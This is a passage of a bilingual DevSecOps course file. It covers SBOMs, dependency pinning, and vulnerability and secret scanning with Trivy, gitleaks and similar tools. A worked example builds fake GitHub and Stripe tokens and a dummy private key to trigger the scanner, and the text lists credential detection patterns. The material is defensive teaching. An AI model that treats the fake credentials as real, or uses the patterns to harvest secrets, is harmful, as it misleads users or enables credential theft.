        hintHi: 'SBOM = ek build mein HAR component ka MACHINE-READABLE inventory. Per component: name, version, supplier, license, aur ek IDENTIFIER — ek PACKAGE URL ("purl", e.g. `pkg:npm/cookie@0.5.0`). DO FORMATS: SPDX — Linux Foundation, ISO/IEC 5962; LICENSE-focused; widest adoption. CycloneDX — OWASP; SECURITY-focused; richer vuln data + VEX statements. CHAAR PROBLEMS: (1) CVE RESPONSE — "konse artifacts mein `lib@1.2.3` hai?" ek QUERY, ek multi-day grep nahi (Log4Shell). (2) DRIFT — 3 mahine pehle scan kiya artifact aaj same risk nahi; STORED SBOMs ko nightly re-scan karो. (3) COMPLIANCE — US EO 14028 + EU CRA. (4) CHANGE VISIBILITY — do SBOMs diff karो. KAHAAN/KAB GENERATE: ACTUAL DEPLOYABLE ARTIFACT se (production image pehle build karो, phir `syft scan $IMAGE`) — OS packages + prod deps capture karे, dev/test EXCLUDE karे. Phir DIGEST se BIND karो.',
      },
      {
        task: 'In a comment, explain the three levels of pinning (range / exact / hash), the trade-offs, and the best-practice combination including the role of update automation.',
        taskHi: 'Ek comment mein, pinning ke teen levels samjhाओ aur best-practice combination.',
        hint: 'THREE LEVELS OF PINNING: (1) RANGE — `"^4.18.0"` (`>=4.18.0 <5`), `"~4.18.0"` (`>=4.18.0 <4.19`), `">=1.2"`. CONVENIENT: picks up patch + minor updates automatically. BUT: non-reproducible ON ITS OWN — the resolved version depends on WHEN you install; you NEED a lockfile to make a range deterministic. (2) EXACT — `"4.18.2"` in the manifest. Reproducible by itself; YOU control exactly when a version changes. Downside: you must actively bump it (→ needs update automation, or you rot). (3) HASH — the `integrity: sha512-...` field in a lockfile / pip `--require-hashes` mode / a pinned `@sha256:...` digest for a container base image / a full commit SHA for a GitHub Action. Adds TAMPER-EVIDENCE ON TOP of an exact version: the bytes that ARRIVE must match the hash you RECORDED or the build FAILS → defends against a registry compromise or a MITM EVEN WHEN the version number is unchanged (a tag/version can be re-published pointing at different bytes; a hash cannot). THE BEST-PRACTICE COMBINATION: exact versions (or ranges) in the MANIFEST for readability + a COMMITTED LOCKFILE carrying integrity HASHES for every package in the transitive tree + CI building with the FROZEN-INSTALL command (so the lock is ENFORCED, not regenerated) + AUTOMATED PULL REQUESTS from Renovate / Dependabot that propose advancing the pins. THE ROLE OF UPDATE AUTOMATION: pinning WITHOUT an update mechanism just means you run known-vulnerable OLD versions FOREVER — "pinned" is not "safe", it is "frozen". The automation makes updates happen DELIBERATELY: visible in a DIFF, SCANNED by CI, REVIEWED, merged ON YOUR SCHEDULE — instead of silently on every build (no lock) or never (pinned + no automation). For container base images specifically: pin BOTH a readable tag AND the digest (`node:20.11.1-bookworm-slim@sha256:...`), and let automation bump both.',
        hintHi: 'TEEN LEVELS: (1) RANGE — `"^4.18.0"`. CONVENIENT: auto patch+minor updates. PAR: apne aap mein non-reproducible — lockfile CHAHIYE. (2) EXACT — `"4.18.2"`. Apne aap reproducible; AAP control karते ho kab change. Downside: actively bump karना padता hai (→ automation chahिए). (3) HASH — lockfile mein `integrity: sha512-...` / pip `--require-hashes` / container base image ke liye pinned `@sha256:...` / ek GitHub Action ke liye full commit SHA. Ek exact version ke UPAR TAMPER-EVIDENCE: aane wale bytes recorded hash se match hone chahिए warna build FAIL → registry compromise / MITM se defend karता hai EVEN jab version number unchanged hai. BEST-PRACTICE COMBO: MANIFEST mein exact versions + ek COMMITTED LOCKFILE hashes ke saath + FROZEN-INSTALL command se CI + Renovate/Dependabot se AUTOMATED PRs. AUTOMATION KA ROLE: bina update mechanism ke pinning = known-vulnerable purani versions HAMESHA. "Pinned" "safe" nahi hai, "frozen" hai. Base images: tag AUR digest DONO pin karो.',
      },
    ],

    keyTakeaways: [
      'YOUR CODE IS MOSTLY NOT YOURS: a manifest of ~3-12 direct deps resolves to a lockfile of hundreds-to-thousands (the transitive closure) — ~1M LOC by ~1,000 strangers running with your app\'s privileges. Your attack surface is the WHOLE tree; a malicious release 6 levels deep is code execution in your service.',
      'THE LOCKFILE IS A SECURITY CONTROL: without one, `"^4.18.0"` resolves to whatever the registry serves at install time → same commit, different code, and a compromised patch release lands silently. A lockfile pins every transitive package to an EXACT version + a CONTENT HASH → reproducible builds + tamper-evidence (`npm ci` → `EINTEGRITY` on a bad tarball). Commit it; build with `npm ci` / `--frozen-lockfile`; NEVER a bare `npm install` in CI.',
      'THREE PINNING LEVELS: RANGE (`^4.18.0` — auto-patches, non-reproducible alone), EXACT (`4.18.2` — reproducible, you choose when to bump), HASH (integrity / `--require-hashes` / `@sha256:` digest — tamper-evident even if the version number is unchanged). Best practice: exact/range in the manifest + committed lockfile with hashes + `npm ci` in CI + Renovate/Dependabot PRs to advance pins (pinning WITHOUT update automation = frozen on known-vulnerable versions forever).',
      'AN SBOM is a machine-readable inventory of every build component (name, version, license, a purl for CVE matching). SPDX (Linux Foundation / ISO 5962, license-focused) and CycloneDX (OWASP, security-focused, carries VEX) are the two formats. Generate it per build FROM THE DEPLOYABLE ARTIFACT (build the prod image, then `syft scan $IMAGE` — captures OS packages + prod deps, excludes dev deps), store it, bind it to the image by digest.',
      'THE SBOM PAYS OFF four ways: (1) CVE response — "which artifacts contain `foo@1.2.3`?" is a query, not a week of grep (Log4Shell); (2) drift — new CVEs hit unchanged old versions, so RE-SCAN stored SBOMs nightly; (3) compliance — US EO 14028, EU CRA make it a requirement; (4) change visibility — diff two SBOMs to see exactly what a bump changed.',
    ],
    keyTakeawaysHi: [
      'AAPKA CODE ZYADATAR AAPKA NAHI: ~3-12 direct deps ka ek manifest sैंkड़ों-se-hazaron ke ek lockfile tak resolve hota hai (transitive closure) — ~1M LOC by ~1,000 ajnabi aapki app ke privileges ke saath running. Attack surface POORA tree hai; ek malicious release 6 levels deep aapki service mein code execution hai.',
      'LOCKFILE EK SECURITY CONTROL HAI: iske bina, `"^4.18.0"` jо bhi registry install time par serve karता hai us par resolve hoता hai → same commit, alag code, aur ek compromised patch release silently land karता hai. Ek lockfile har transitive package ko ek EXACT version + ek CONTENT HASH par pin karता hai → reproducible builds + tamper-evidence. Ise commit karो; `npm ci` / `--frozen-lockfile` se build karो; CI mein KABHI ek bare `npm install` nahi.',
      'TEEN PINNING LEVELS: RANGE (`^4.18.0` — auto-patches, akele non-reproducible), EXACT (`4.18.2` — reproducible, aap choose karते ho kab bump), HASH (integrity / `--require-hashes` / `@sha256:` digest — tamper-evident even agar version number unchanged hai). Best practice: manifest mein exact/range + committed lockfile hashes ke saath + CI mein `npm ci` + Renovate/Dependabot PRs. Update automation ke BINA pinning = known-vulnerable versions par hamesha frozen.',
      'EK SBOM har build component ka ek machine-readable inventory hai (name, version, license, CVE matching ke liye ek purl). SPDX (Linux Foundation / ISO 5962, license-focused) aur CycloneDX (OWASP, security-focused, VEX carry karता hai) do formats hain. Ise per build DEPLOYABLE ARTIFACT SE generate karो (prod image build karो, phir `syft scan $IMAGE`), store karो, image se digest dwara bind karो.',
      'SBOM CHAAR TAREEKON SE PAY KARTA HAI: (1) CVE response — "konse artifacts mein `foo@1.2.3` hai?" ek query hai, ek hafta grep nahi (Log4Shell); (2) drift — naye CVEs unchanged purani versions ko hit karते hain, to stored SBOMs ko nightly RE-SCAN karो; (3) compliance — US EO 14028, EU CRA ise ek requirement banाते hain; (4) change visibility — do SBOMs diff karो.',
    ],
  },

  {
    slug: 'ops-vulnerability-and-secret-scanning-in-ci',
    title: 'Vulnerability & Secret Scanning in CI',
    titleHi: 'CI Mein Vulnerability Aur Secret Scanning',
    description:
      'The scanners that run on every pull request: SCA for known CVEs in your dependencies, secret scanning for keys committed to code and history, and a note on SAST, DAST, and IaC scanning. How to read a vulnerability report (severity, fixed version, whether it is reachable), how to gate without drowning in noise, and running Trivy against a dependency file and a directory.',
    descriptionHi:
      'Wo scanners jо har pull request par run hote hain: aapki dependencies mein known CVEs ke liye SCA, code aur history mein committed keys ke liye secret scanning, aur SAST, DAST, aur IaC scanning par ek note. Ek vulnerability report kaise padhें, noise mein doobे bina kaise gate karें, aur Trivy ko ek dependency file aur ek directory ke against run karना.',
    difficulty: 'MEDIUM',
    duration: 24,
    order: 3,

    analogy: {
      en: '**A building inspector with a checklist versus a smoke detector versus a guard who notices the spare key under the mat.** The inspector (SCA) walks your list of materials and cross-checks it against every recall notice and safety bulletin ever issued — "this wiring loom was recalled, this beam spec is now known to be weak". The smoke detector (DAST) does not care about your materials list; it only reacts when something is actually burning while the building is occupied. And the guard doing a walk-through (secret scanning) is looking for the specific, unambiguous mistakes: a key left under the mat, a password on a sticky note, a door propped open. Each catches a different category, and you want all three — but the guard\'s finding, a key under the mat, is the one you fix before anyone goes home tonight.',
      hi: '**Ek building inspector ek checklist ke saath versus ek smoke detector versus ek guard jо mat ke neeche spare key notice karता hai.** Inspector (SCA) aapke materials ki list walk karता hai aur ise har recall notice ke against cross-check karता hai — "ye wiring loom recall hua, ye beam spec ab weak jaana jaता hai". Smoke detector (DAST) aapke materials list ki parvah nahi karता; ye sirf tab react karता hai jab kुछ actually jal raha hai jab building occupied hai. Aur guard jо walk-through kar raha hai (secret scanning) specific, unambiguous mistakes dhoondh raha hai: mat ke neeche ek key, ek sticky note par ek password. Har ek ek alag category catch karता hai.',
    },

    simple: `**SCA — Software Composition Analysis (dependency CVE scanning):**
\`\`\`
input:   your lockfile / SBOM / installed packages
does:    match each component (by purl/version) against vuln databases
         (NVD, GitHub Advisories, distro trackers, OSV)
output:  package | CVE | severity | installed version | FIXED version | is-there-a-fix
tools:   Trivy, Grype, Snyk, Dependabot, 'npm audit', 'pip-audit', 'govulncheck'
run:     every PR (gate NEW criticals-with-a-fix) + nightly on the SBOM store.
\`\`\`

**READING A VULN REPORT — not every CRITICAL is your emergency:**
\`\`\`
SEVERITY (CVSS)      a starting point, not a verdict. context matters more.
FIXED VERSION        "" (empty) = no fix yet -> you can't gate on it, track it.
                     "2.3.2" = a fix exists -> gate NEW instances of this.
REACHABILITY         is the vulnerable function actually CALLED by your code?
                     'govulncheck' / Snyk reachability cut the list 5-10x.
EXPLOITABILITY        is it in KEV (CISA Known Exploited Vulns)? EPSS score?
                     a KEV entry = patch now. a theoretical DoS in a CLI flag you
                     don't use = a ticket.
VEX                  your recorded judgement: "present, not exploitable, because <reason>"
\`\`\`

**SECRET SCANNING — find keys/tokens in code + git HISTORY:**
\`\`\`
detects:  provider-specific patterns (AWS AKIA..., GitHub ghp_..., Stripe sk_live_...,
          Slack xoxb-..., private keys, JWTs, high-entropy strings).
where:    pre-commit hook (block before it's committed) + CI (catch what slipped) +
          server-side PUSH PROTECTION (block at the remote) + full HISTORY scan once.
CRITICAL: a committed secret is compromised the moment it's pushed. the fix is
          ALWAYS: 1. ROTATE the credential (assume it's leaked). 2. THEN purge
          history (BFG / filter-repo). removing the commit is NOT enough - it's
          in forks, clones, mirrors, the reflog, someone's laptop, GitHub's cache.
tools:    gitleaks, trufflehog, Trivy (--scanners secret), GitHub secret scanning.
\`\`\`

**THE OTHER THREE (briefly):**
\`\`\`
SAST   parses YOUR source into an AST / data-flow graph, looks for taint paths
       (user input -> SQL string), unsafe APIs, weak crypto. Semgrep, CodeQL, Bandit,
       gosec. tuned rules > default rules (defaults are noisy).
DAST   drives a RUNNING app: fuzzes params, checks headers/cookies/TLS, tries
       auth bypass. OWASP ZAP, Burp. needs a deployed target (staging). slow -> nightly.
IaC    parses Terraform / CFN / K8s / Dockerfile for insecure config: public buckets,
       0.0.0.0/0 ingress, no encryption, privileged containers. Trivy config, Checkov,
       tfsec, kube-linter, Kubescape. fast + offline -> every PR.
\`\`\`

**GATING WITHOUT NOISE:**
\`\`\`
- gate on NEW findings only (baseline / ignore-file for existing).
- gate on: severity >= HIGH AND a fix is available AND (reachable OR in KEV).
- everything else -> a tracked issue with an SLA (e.g. CRITICAL 7d, HIGH 30d).
- suppressions need a reason + an expiry, and are reviewed. no permanent '# nosec'.
- one dashboard: open findings by severity, by age, by team. trend it down.
\`\`\``,

    simpleHi: `**SCA — Software Composition Analysis (dependency CVE scanning):**
\`\`\`
input:   aapka lockfile / SBOM / installed packages
karता hai: har component (purl/version se) match karता hai vuln databases ke against
           (NVD, GitHub Advisories, distro trackers, OSV)
output:  package | CVE | severity | installed version | FIXED version | fix hai kya
tools:   Trivy, Grype, Snyk, Dependabot, 'npm audit', 'pip-audit', 'govulncheck'
run:     har PR (NAYE criticals-with-a-fix gate karो) + nightly SBOM store par.
\`\`\`

**EK VULN REPORT PADHNA — har CRITICAL aapki emergency nahi hai:**
\`\`\`
SEVERITY (CVSS)      ek starting point, ek verdict nahi. context zyada matter karता hai.
FIXED VERSION        "" (empty) = abhi tak koi fix nahi -> ispar gate nahi kar sakते, track karो.
                     "2.3.2" = ek fix exist karता hai -> iske NAYE instances gate karो.
REACHABILITY         kya vulnerable function actually aapke code dwara CALLED hai?
                     'govulncheck' / Snyk reachability list ko 5-10x cut karते hain.
EXPLOITABILITY        kya ye KEV mein hai (CISA Known Exploited Vulns)? EPSS score?
                     ek KEV entry = ab patch karो.
VEX                  aapkा recorded judgement: "present, not exploitable, because <reason>"
\`\`\`

**SECRET SCANNING — code + git HISTORY mein keys/tokens dhoondhो:**
\`\`\`
detect karता hai:  provider-specific patterns (AWS AKIA..., GitHub ghp_..., Stripe sk_live_...,
                   Slack xoxb-..., private keys, JWTs, high-entropy strings).
kahaan:   pre-commit hook (commit hone se pehle block) + CI (jо slip hua wo catch) +
          server-side PUSH PROTECTION (remote par block) + full HISTORY scan ek baar.
CRITICAL: ek committed secret us moment compromised hai jab ye pushed hota hai. fix
          HAMESHA hai: 1. credential ROTATE karो (maan lो ye leaked hai). 2. PHIR
          history purge karो (BFG / filter-repo). commit remove karना KAAFI NAHI hai.
tools:    gitleaks, trufflehog, Trivy (--scanners secret), GitHub secret scanning.
\`\`\`

**DOOSRE TEEN (briefly):**
\`\`\`
SAST   AAPKE source ko ek AST / data-flow graph mein parse karता hai, taint paths dhoondhता hai
       (user input -> SQL string), unsafe APIs, weak crypto. Semgrep, CodeQL, Bandit, gosec.
DAST   ek RUNNING app drive karता hai: params fuzz karता hai, headers/cookies/TLS check karता hai.
       OWASP ZAP, Burp. ek deployed target chahिए (staging). slow -> nightly.
IaC    Terraform / CFN / K8s / Dockerfile ko insecure config ke liye parse karता hai: public
       buckets, 0.0.0.0/0 ingress, no encryption, privileged containers. Trivy config, Checkov.
\`\`\`

**BINA NOISE KE GATING:**
\`\`\`
- sirf NAYE findings par gate karो (existing ke liye baseline / ignore-file).
- gate karो: severity >= HIGH AND ek fix available AND (reachable OR KEV mein).
- baaki sab -> ek tracked issue ek SLA ke saath (e.g. CRITICAL 7d, HIGH 30d).
- suppressions ko ek reason + ek expiry chahिए, aur review hote hain.
- ek dashboard: open findings by severity, by age, by team. ise neeche trend karो.
\`\`\``,

    content: `## Software composition analysis

SCA takes your resolved dependency set — from the lockfile, the SBOM, or the installed packages in an image — and matches each component against vulnerability databases: the NVD, GitHub Advisories, language-ecosystem advisory feeds, Linux distribution trackers, and the OSV aggregator. For each match it reports the package, the CVE identifier, a severity, the version you have installed, the version that fixes it if one exists, and whether a fix is available at all. Tools in this space include Trivy, Grype, Snyk, Dependabot, and the ecosystem-native ones — \`npm audit\`, \`pip-audit\`, \`govulncheck\`, \`bundler-audit\`. SCA runs on every pull request, gating on newly introduced critical vulnerabilities that have a fix, and it also runs on a schedule against your stored SBOMs so that a CVE published today against a version you shipped months ago is caught within a day.

## Reading a vulnerability report

A list of CVEs is a starting point, not a work order, and treating every critical as an immediate incident will exhaust the team. Several dimensions refine the raw list. **Severity**, usually a CVSS score, indicates potential impact but is assigned without knowledge of your specific usage, so it over- and under-states real risk regularly. **Fixed version** is the single most actionable field: if it is empty there is no fix yet, so you cannot remediate by upgrading and the finding goes onto a tracked list; if it names a version, a fix exists and you should gate against new instances of this vulnerability. **Reachability** asks whether your code actually calls the vulnerable function — a CVE in a code path your application never executes is a much lower priority than one in a hot path, and tools like \`govulncheck\` for Go or the reachability analysis in commercial scanners can cut a raw list by five to ten times. **Exploitability** asks whether the vulnerability is actually being used against people: CISA\'s Known Exploited Vulnerabilities catalogue and the EPSS probability score both help here, and a KEV entry means patch now regardless of CVSS, while a theoretical denial-of-service in a command-line flag you do not pass is a low-priority ticket. **VEX** is where you record your own analysis so it is not repeated: a machine-readable statement that a given CVE is present but not exploitable in your product, with the reason.

## Secret scanning

Secret scanning looks for credentials in your code and, critically, in your git history: provider-specific patterns like an AWS access key ID beginning \`AKIA\`, a GitHub personal access token beginning \`ghp_\`, a Stripe secret key beginning \`sk_live_\`, a Slack bot token beginning \`xoxb-\`, PEM-encoded private keys, JWTs, and generic high-entropy strings in suspicious contexts. It belongs in four places: a pre-commit hook that blocks the secret before it is committed, a CI check that catches anything that slipped past the hook, server-side push protection that rejects the push at the remote, and a one-time scan of the entire history. The operational point that people get wrong: a secret that has been committed and pushed must be treated as compromised from that instant, so the response is always, first, to rotate the credential — issue a new one and revoke the old — on the assumption that it has been scraped, and only then to purge it from history with a tool like BFG or \`git filter-repo\`. Simply removing the commit or force-pushing over it does not help, because the object still exists in every fork, clone, mirror, CI cache, and local reflog, and automated scrapers capture public-repo secrets within seconds of the push.

## SAST, DAST, and IaC scanning

SAST parses your own source into an abstract syntax tree and a data-flow graph and looks for dangerous patterns: a taint path from user input to a SQL string or a shell command, use of a known-unsafe API, weak or misused cryptography. Semgrep, CodeQL, Bandit, and gosec are common; the important practical note is that tuned rulesets massively outperform default rulesets, which are noisy enough to get the tool ignored. DAST drives a running instance of the application — fuzzing parameters, checking security headers and cookie flags and TLS configuration, attempting authentication bypass — and therefore needs a deployed target, usually staging, and is slow enough to run nightly rather than per-PR. IaC scanning parses Terraform, CloudFormation, Kubernetes manifests, and Dockerfiles for insecure configuration: a storage bucket open to the public, a security group allowing \`0.0.0.0/0\` inbound, missing encryption, a privileged container. Trivy\'s config mode, Checkov, tfsec, kube-linter, and Kubescape do this, and because it is fast and fully offline it runs on every pull request.

## Gating without drowning in noise

The failure mode of scanning is a gate so noisy that it gets disabled, so the gating logic must be selective. Gate only on newly introduced findings, using a baseline or ignore-file to exclude the pre-existing backlog. Within the new findings, gate on the conjunction of conditions that indicate real, actionable risk: severity of high or above, and a fix is available, and either the vulnerable code is reachable or the CVE is in the Known Exploited Vulnerabilities catalogue. Everything that does not meet that bar becomes a tracked issue with a remediation SLA — for example seven days for critical, thirty for high — rather than a build failure. Suppressions are allowed but must carry a documented reason and an expiry date and be reviewed, so there is no permanent \`# nosec\` accumulating silently. And all of it feeds one dashboard showing open findings by severity, by age, and by owning team, with the trend line going down — because the goal is a shrinking backlog, and a number nobody looks at does not shrink.`,

    contentHi: `## Software composition analysis

SCA aapke resolved dependency set ko leता hai — lockfile, SBOM, ya ek image mein installed packages se — aur har component ko vulnerability databases ke against match karता hai: NVD, GitHub Advisories, language-ecosystem advisory feeds, Linux distribution trackers, aur OSV aggregator. Har match ke liye ye package, CVE identifier, ek severity, jо version aapne installed hai, jо version ise fix karता hai agar ek exist karता hai, aur kya ek fix available hai at all report karता hai. Is space mein tools mein Trivy, Grype, Snyk, Dependabot, aur ecosystem-native wale shaamil hain — \`npm audit\`, \`pip-audit\`, \`govulncheck\`. SCA har pull request par run hota hai, aur ye aapke stored SBOMs ke against ek schedule par bhi run hota hai.

## Ek vulnerability report padhna

CVEs ki ek list ek starting point hai, ek work order nahi, aur har critical ko ek immediate incident treat karना team ko exhaust karेगा. Kई dimensions raw list ko refine karते hain. **Severity**, usually ek CVSS score, potential impact indicate karता hai par aapke specific usage ke knowledge ke bina assigned hai. **Fixed version** single sabse actionable field hai: agar ye empty hai koi fix abhi nahi hai; agar ye ek version name karता hai, ek fix exist karता hai. **Reachability** poochहता hai kya aapka code actually vulnerable function ko call karता hai — \`govulncheck\` jaise tools ek raw list ko paanch se das guna cut kar sakते hain. **Exploitability** poochहता hai kya vulnerability actually logon ke against use ho raha hai: CISA ka Known Exploited Vulnerabilities catalogue. **VEX** wahaan hai jahaan aap apna analysis record karते ho.

## Secret scanning

Secret scanning aapke code mein aur, critically, aapki git history mein credentials dhoondhता hai: provider-specific patterns jaise ek AWS access key ID \`AKIA\` se shuru, ek GitHub personal access token \`ghp_\` se shuru, ek Stripe secret key \`sk_live_\` se shuru, PEM-encoded private keys, JWTs. Ye chaar jagah belong karता hai: ek pre-commit hook jо secret ko commit hone se pehle block karता hai, ek CI check, server-side push protection, aur poori history ka ek one-time scan. Operational point jо log galat karते hain: ek secret jо committed aur pushed ho gaya hai us instant se compromised treat kiya jaना chahिए, to response hamesha hai, pehle, credential rotate karना — ek naya issue karो aur purana revoke karो — is assumption par ki ise scrape kiya gaya hai, aur sirf phir ise history se purge karना BFG ya \`git filter-repo\` jaise ek tool se. Simply commit remove karना madad nahi karता.

## SAST, DAST, aur IaC scanning

SAST aapke apne source ko ek abstract syntax tree aur ek data-flow graph mein parse karता hai aur dangerous patterns dhoondhता hai: user input se ek SQL string tak ek taint path, ek known-unsafe API ka use, weak cryptography. Semgrep, CodeQL, Bandit common hain; important practical note ye hai ki tuned rulesets default rulesets ko massively outperform karते hain. DAST application ka ek running instance drive karता hai aur isliye ek deployed target chahिए, usually staging, aur nightly run karने ke liye kaafi slow hai. IaC scanning Terraform, CloudFormation, Kubernetes manifests, aur Dockerfiles ko insecure configuration ke liye parse karता hai. Trivy ka config mode, Checkov, tfsec ye karते hain, aur kyunki ye fast aur fully offline hai ye har pull request par run hota hai.

## Bina noise ke gating

Scanning ka failure mode ek gate hai jо itna noisy hai ki ye disable ho jaता hai, to gating logic selective hona chahिए. Sirf naye introduced findings par gate karो, ek baseline ya ignore-file use karके pre-existing backlog exclude karने ke liye. Naye findings ke andar, conditions ke conjunction par gate karो jо real, actionable risk indicate karती hain: severity of high ya above, aur ek fix available, aur ya to vulnerable code reachable hai ya CVE Known Exploited Vulnerabilities catalogue mein hai. Jо us bar ko meet nahi karता wo ek tracked issue ban jaता hai ek remediation SLA ke saath. Suppressions allowed hain par ek documented reason aur ek expiry date carry karना chahिए.`,

    examples: [
      {
        title: 'Trivy in CI: specific CVEs in a dependency file, and secrets in the tree',
        titleHi: 'CI mein Trivy: ek dependency file mein specific CVEs, aur tree mein secrets',
        code: `# VERIFY
mkdir svc && cd svc

# a dependency file with three known-vulnerable pins
cat > requirements.txt <<'TXT'
flask==2.0.1
requests==2.25.1
jinja2==2.11.3
TXT

# a config file with two secret-shaped strings + a private key. the tokens are
# ASSEMBLED at runtime, so this course repo never commits a real 'sk_live_...' /
# 'ghp_...' literal (which push protection would rightly block):
GH="ghp_"; GH="\${GH}016C7e42F292c6912E7710c838347Ae178B4a"
SK="sk_live_"; SK="\${SK}abcdefghij0123456789ABCD"
printf 'GITHUB_TOKEN = "%s"\\nSTRIPE_KEY = "%s"\\n' "\${GH}" "\${SK}" > settings.py
{ echo "-----BEGIN RSA PRIVATE KEY-----"
  echo "MIIEpAIBAAKCAQEA0000000000000000000000000000000000000000000000000"
  echo "-----END RSA PRIVATE KEY-----"; } > deploy_key

echo "=== SCA: known CVEs in requirements.txt (assert specific stable CVE IDs) ==="
trivy fs --scanners vuln --quiet --format json requirements.txt 2>/dev/null > sca.json
python3 - <<'PY'
import json
d = json.load(open('sca.json'))
want = {'CVE-2023-30861', 'CVE-2024-22195', 'CVE-2023-32681'}
rows = []
for r in d.get('Results', []):
    for v in r.get('Vulnerabilities', []):
        if v['VulnerabilityID'] in want:
            rows.append((v['PkgName'], v['InstalledVersion'], v['VulnerabilityID'],
                         v['Severity'], v.get('FixedVersion', '(no fix)')))
for pkg, iv, cve, sev, fix in sorted(rows):
    print('  %-9s %-8s %-16s %-8s -> fix in %s' % (pkg, iv, cve, sev, fix))
PY

echo ""
echo "=== SECRET scanning: keys in the tree (sorted for determinism) ==="
trivy fs --scanners secret --quiet . 2>/dev/null \\
  | grep -oE '(CRITICAL|HIGH): [A-Za-z]+ \\([a-z-]+\\)' | sort | sed 's/^/  /'`,
        output: `=== SCA: known CVEs in requirements.txt (assert specific stable CVE IDs) ===
  flask     2.0.1    CVE-2023-30861   HIGH     -> fix in 2.3.2, 2.2.5
  jinja2    2.11.3   CVE-2024-22195   MEDIUM   -> fix in 3.1.3
  requests  2.25.1   CVE-2023-32681   MEDIUM   -> fix in 2.31.0

=== SECRET scanning: keys in the tree (sorted for determinism) ===
  CRITICAL: GitHub (github-pat)
  CRITICAL: Stripe (stripe-secret-token)
  HIGH: AsymmetricPrivateKey (private-key)
`,
        explain: 'One tool, two of the pipeline scanners. The SCA pass reads the dependency file, matches each pin against vulnerability feeds, and reports the package, the installed version, the CVE, its severity, and — the field that drives action — the version that fixes it. Flask 2.0.1 has a high-severity issue fixed in 2.3.2, so a pull request that introduces or keeps that pin should be gated; the requests and jinja2 findings are medium and become tracked issues with an SLA. The example asserts three specific CVE IDs rather than a total count, because the vulnerability database updates continuously and the count drifts while a given CVE against a given version is stable. The secret pass scans the working tree and finds three credentials by their provider-specific shapes: a GitHub personal access token and a Stripe live secret key, both classified critical, and an RSA private key, classified high. Each of these is compromised the moment it reaches the remote, so the response is to rotate the credential first and purge history second. Both scans run fully offline once Trivy\'s vulnerability database is cached, which happens on the first run and persists, so this fits on every pull request.',
        explainHi: 'Ek tool, do pipeline scanners. SCA pass dependency file padhता hai, har pin ko vulnerability feeds ke against match karता hai, aur package, installed version, CVE, iski severity, aur — jо field action drive karता hai — jо version ise fix karता hai report karता hai. Flask 2.0.1 mein ek high-severity issue hai jо 2.3.2 mein fixed hai, to ek pull request jо us pin ko introduce ya keep karता hai gate hona chahिए; requests aur jinja2 findings medium hain aur ek SLA ke saath tracked issues ban jaते hain. Example teen specific CVE IDs assert karता hai ek total count ke bजाय, kyunki vulnerability database continuously update hota hai. Secret pass working tree scan karता hai aur teen credentials paता hai: ek GitHub personal access token aur ek Stripe live secret key, dono critical classified, aur ek RSA private key, high classified. In mein se har ek us moment compromised hai jab ye remote tak pahunchता hai.',
      },
    ],

    mistakes: [
      {
        wrong: `# gating on ALL criticals, including ones with no fix -> the build is red forever
  - run: trivy fs --exit-code 1 --severity CRITICAL,HIGH .
  # among the 40 HIGH/CRITICAL findings:
  #   - 12 have NO fixed version (the maintainer hasn't shipped a patch)
  #   - 8 are in a dev-only dependency not shipped to prod
  #   - 15 are in code paths the app never calls
  #   - 5 are real, reachable, fixable -> the ones that matter
  # every PR fails on the 35 you can't action. devs add  --exit-code 0  "for now".
  # the 5 real ones are now invisible in a check that everyone ignores.`,
        right: `# gate on the actionable subset; track the rest with an SLA
  - run: |
      trivy fs --quiet --format json \\
        --severity HIGH,CRITICAL \\
        --ignore-unfixed \\                  # no fix -> not a gate (it's a tracked issue)
        --ignorefile .trivyignore \\          # pre-existing baseline, each line dated + owned
        . > scan.json
      # gate only on NEW, fixed, reachable/KEV findings:
      python gate.py scan.json   # exits 1 only if a finding is: new AND fixed AND (reachable OR in KEV)
  # the unfixed + unreachable + dev-only findings go to a dashboard with SLAs
  # (CRITICAL 7d, HIGH 30d). suppressions in .trivyignore need a reason + expiry.
  # now the gate fires ~monthly, on something real, and people act on it.`,
        why: 'Gating on every high and critical finding regardless of whether it can be acted on guarantees that the gate is red for reasons the developer cannot fix: vulnerabilities with no patch available, vulnerabilities in development-only dependencies that never ship, and vulnerabilities in code paths the application does not execute. When most of the failures are un-actionable, the rational response from the team is to stop treating the check as a gate — disabling it, setting the exit code to zero, or routinely overriding it — and once that habit forms, the small number of findings that are real, reachable, and fixable are lost in a check nobody reads. The fix is to make the gate fire only on the subset that represents genuine actionable risk: a finding that is newly introduced by this change, has a fix available, and is either reachable in your code or listed in the Known Exploited Vulnerabilities catalogue. Everything else — unfixed, unreachable, dev-only, pre-existing — is legitimate work but belongs on a tracked backlog with remediation SLAs, not on the critical path of every merge. A gate that fires rarely and always on something real keeps its authority.',
        whyHi: 'Har high aur critical finding par gating regardless of whether ispar action liya ja sakта hai guarantee karता hai ki gate un reasons ke liye red hai jо developer fix nahi kar sakта: koi patch available nahi wali vulnerabilities, development-only dependencies mein vulnerabilities jо kabhi ship nahi hoती, aur code paths mein vulnerabilities jо application execute nahi karता. Jab zyादातर failures un-actionable hain, team se rational response check ko ek gate treat karना band karना hai. Fix gate ko sirf us subset par fire karना hai jо genuine actionable risk represent karता hai: ek finding jо is change dwara newly introduced hai, ek fix available hai, aur ya to aapke code mein reachable hai ya Known Exploited Vulnerabilities catalogue mein listed hai. Baaki sab ek tracked backlog par belong karता hai.',
      },
      {
        wrong: `# a secret is found in CI. the "fix": delete the line, force-push, close the alert.
  git rm --cached config/prod.env
  git commit -m "remove secret"
  git push --force                       # <-- "it's gone now"
  # the AWS key AKIA... was in a public repo for 4 hours. reality:
  #   - automated scrapers had it within ~30 seconds of the first push
  #   - it's still in the reflog, in every clone/fork, in CI caches, in the
  #     PR's "files changed" history, in GitHub's API for old commits
  #   - force-push doesn't remove it from anyone else's copy
  # the key is LIVE and being used. deleting the line changed nothing that matters.`,
        right: `# order of operations: ROTATE first, always. purge history second.
  # 1. ROTATE NOW - assume the credential is compromised the instant it was pushed:
  #    - AWS: deactivate the access key, create a new one, update the secret store
  #    - check CloudTrail for use of the old key from unexpected IPs since the push
  # 2. THEN remove it from history (so it doesn't get re-leaked / re-flagged):
  #    git filter-repo --path config/prod.env --invert-paths     # or BFG
  #    # coordinate: everyone re-clones; old PRs/forks may still carry it
  # 3. PREVENT the recurrence:
  #    - pre-commit gitleaks hook + server-side push protection (block at the remote)
  #    - the secret should have been a reference to a secret manager, never a literal
  #    - add the pattern to the scanner if it was a custom token format
  # removing the commit is step 2, and it is USELESS without step 1.`,
